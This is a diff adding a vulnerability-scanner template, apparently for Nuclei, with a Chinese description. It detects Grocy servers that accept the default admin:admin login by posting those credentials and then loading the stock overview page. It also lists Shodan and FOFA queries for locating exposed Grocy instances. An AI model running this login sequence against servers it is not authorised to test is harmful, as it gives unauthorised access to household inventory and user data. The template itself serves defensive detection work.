@@ -1,0 +1,69 @@
+id: grocy-default-admin-password-login
+
+info:
+  name: Grocy 默认管理员口令登录漏洞
+  author: 0x_Akoko
+  severity: high
+  description: |
+    检测到 Grocy 使用默认凭据 admin:admin 登录成功。攻击者可借此获得该家庭管理平台的完整访问权限，包括所有库存数据、杂务、食谱及用户设置。
+  reference:
+    - https://github.com/grocy/grocy
+    - https://docs.linuxserver.io/images/docker-grocy/
+  metadata:
+    verified: true
+    max-request: 3
+    vendor: grocy
+    product: grocy
+    shodan-query: 'http.title:"grocy"'
+    fofa-query: 'title="grocy" || body="grocy-version"'
+  tags: Grocy
+  remediation: >-
+    升级受影响产品至最新的厂商支持版本，并安装所有可用的安全补丁。如果暂时无法升级，应限制对受影响端点的访问，尽可能禁用存在风险的功能，并采取身份认证、网络隔离和请求过滤等补偿性措施。同时检查相关 日志，并轮换可能已暴露的凭据或密钥。
+
+variables:
+  username: "admin"
+  password: "admin"
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - raw:
+      - |
+        GET /login HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+    matchers:
+      - type: dsl
+        internal: true
+        dsl:
+          - 'status_code == 200'
+          - 'contains_all(to_lower(body), "grocy", "username", "password")'
+        condition: and
+  - raw:
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: text/html
+
+        username={{username}}&password={{password}}
+    matchers:
+      - type: dsl
+        internal: true
+        dsl:
+          - 'status_code == 302'
+          - '!contains(to_lower(header), "/login")'
+        condition: and
+  - raw:
+      - |
+        GET /stockoverview HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains_all(to_lower(body), "stock overview", "grocy")'
+        condition: and
+
+# digest: 4b0a00483046022100ec135fc82b2b83a18fedcedb0fcb250900fc26b843ca1f4e8f3b333b3294828e022100891cf2ecd4e7496c891919116fa94f622f23be7420b1d7cdd4b9b7e8dbe79004:922c64590222798bb761d5b6d8e72950
